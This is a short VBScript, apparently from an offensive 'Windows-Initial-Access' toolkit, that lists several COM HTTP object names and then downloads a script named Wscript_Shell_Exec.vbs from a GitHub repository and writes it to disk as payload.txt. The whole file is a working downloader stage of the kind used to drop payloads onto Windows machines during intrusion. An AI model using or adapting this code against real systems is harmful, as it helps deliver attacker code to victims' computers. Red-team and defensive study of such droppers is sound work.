' "WinHttp.WinHttpRequest.5.1"
' "WinHttp.WinHttpRequest"
' "MSXML2.ServerXMLHTTP"
' "Microsoft.XMLHTTP"
' "MSXML2.XMLHTTP.6.0"

Set xHttp = CreateObject("MSXML2.XMLHTTP.6.0")
xHttp.Open "GET", "https://raw.githubusercontent.com/hegusung/Windows-Initial-Access/main/VBS/Wscript_Shell_Exec.vbs", False
xHttp.Send

Set bStrm = CreateObject("Adodb.Stream")
With bStrm
    .Type = 1
    .Open
    .write xHttp.responseBody
    .savetofile ".\payload.txt", 2
End With